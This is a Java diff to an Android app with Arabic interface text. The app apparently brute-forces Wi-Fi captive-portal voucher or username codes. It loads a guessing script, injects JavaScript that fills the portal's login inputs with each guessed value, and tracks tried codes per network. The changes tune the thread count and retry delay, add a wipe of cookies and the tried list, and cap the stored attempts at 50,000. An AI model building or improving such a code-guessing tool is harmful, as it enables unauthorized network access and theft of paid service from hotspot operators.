@@ -60,9 +60,9 @@ public class MainActivity extends Activity {
         etDigits.setText(prefs.getString("digits", "2"));
         etAttempts.setText(prefs.getString("attempts", "100"));
         etPause.setText(prefs.getString("pause", "300"));
-        etRetry.setText(prefs.getString("retry", "1000"));
+        etRetry.setText(prefs.getString("retry", "1500"));
         etStatusEvery.setText(prefs.getString("statusEvery", "50"));
-        etRttEvery.setText(prefs.getString("threads", "3"));
+        etRttEvery.setText(prefs.getString("threads", "4"));
 
         try {
             InputStream is = getAssets().open("finder.js");
@@ -120,14 +120,15 @@ public class MainActivity extends Activity {
 
     private void clearProgress() {
         new AlertDialog.Builder(this)
-            .setTitle("مسح سجل التخمين")
-            .setMessage("هل أنت متأكد من مسح جميع الأرقام التي تم تخمينها لهذه الشبكة؟")
+            .setTitle("مسح كل شيء والبدء من جديد")
+            .setMessage("سيتم مسح كل الأرقام المجربة والكوكيز، وسيبدأ التطبيق من الصفر لهذه الشبكة. هل أنت متأكد؟")
             .setPositiveButton("نعم", (d, w) -> {
-                Set<String> empty = new HashSet<>();
-                prefs.edit().putStringSet("tried_" + currentNetwork, empty).apply();
+                prefs.edit().remove("tried_" + currentNetwork).apply();
+                CookieManager.getInstance().removeAllCookies(null);
+                CookieManager.getInstance().flush();
                 logBuf.setLength(0);
-                logText.setText("🗑️ تم مسح سجل التخمين بنجاح.\n");
-                Toast.makeText(this, "تم المسح", Toast.LENGTH_SHORT).show();
+                logText.setText("🗑️ تم مسح السجل والكوكيز. اضغط ابدأ للتخمين من جديد.\n");
+                Toast.makeText(this, "تم المسح الشامل", Toast.LENGTH_SHORT).show();
             })
             .setNegativeButton("إلغاء", null)
             .show();
@@ -151,9 +152,9 @@ public class MainActivity extends Activity {
         int digits = pi(etDigits, 2);
         int attempts = pi(etAttempts, 100);
         int pause = pi(etPause, 300);
-        int retry = pi(etRetry, 1000);
+        int retry = pi(etRetry, 1500);
         int statusEvery = pi(etStatusEvery, 50);
-        int threads = pi(etRttEvery, 3);
+        int threads = pi(etRttEvery, 4);
 
         prefs.edit()
             .putString("prefix", prefix).putString("suffix", suffix)
@@ -176,7 +177,7 @@ public class MainActivity extends Activity {
         triedJson.append("]");
 
         logBuf.setLength(0);
-        logText.setText("");
+        logText.setText("📊 الأرقام المجربة سابقاً في هذه الشبكة: " + c + "\n\n");
         voucherResult.setVisibility(View.GONE);
         statusText.setText("جاري التخمين...");
 
@@ -223,7 +224,6 @@ public class MainActivity extends Activity {
         @JavascriptInterface public void log(String m) {
             runOnUiThread(() -> appendLog(m));
         }
-        
         @JavascriptInterface public void clearCookies() {
             runOnUiThread(() -> {
                 CookieManager.getInstance().removeAllCookies(null);
@@ -233,6 +233,11 @@ public class MainActivity extends Activity {
         @JavascriptInterface public void saveTried(String v) {
             Set<String> triedSet = new HashSet<>(prefs.getStringSet("tried_" + currentNetwork, new HashSet<>()));
             triedSet.add(v);
+            // الحد الأقصى 50000 لتجنب بطء الهاتف
+            if (triedSet.size() > 50000) {
+                java.util.List<String> list = new java.util.ArrayList<>(triedSet);
+                triedSet = new HashSet<>(list.subList(list.size() - 50000, list.size()));
+            }
             prefs.edit().putStringSet("tried_" + currentNetwork, triedSet).apply();
         }
         @JavascriptInterface public void progress(int c, int t, String v) {
@@ -250,24 +255,17 @@ public class MainActivity extends Activity {
                 
                 String js = "javascript:(function() {" +
                     "var inputs = document.querySelectorAll('input');" +
-                    "var found = false;" +
                     "for (var i=0; i<inputs.length; i++) {" +
                     "  var inp = inputs[i];" +
-                    "  if (inp.type === 'text' || inp.type === 'tel' || inp.name.includes('username') || inp.id.includes('username') || inp.id.includes('voucher')) {" +
+                    "  if (inp.type === 'text' || inp.type === 'tel' || inp.name.includes('username') || inp.id.includes('username')) {" +
                     "    inp.value = '" + v + "';" +
                     "    inp.dispatchEvent(new Event('input', {bubbles:true}));" +
                     "    inp.dispatchEvent(new Event('change', {bubbles:true}));" +
-                    "    found = true;" +
                     "    break;" +
                     "  }" +
                     "}" +
-                    "if (found) {" +
-                    "  var btn = document.querySelector('input[type=\"submit\"], button[type=\"submit\"], .login-btn, .btn-login');" +
-                    "  // لا نضغط زر الدخول تلقائياً لكي لا تتلوث الجلسة" +
-                    "}" +
                     "})()";
                 webView.evaluateJavascript(js, null);
-                // لا نعيد التحميل تلقائياً
             });
         }
     }
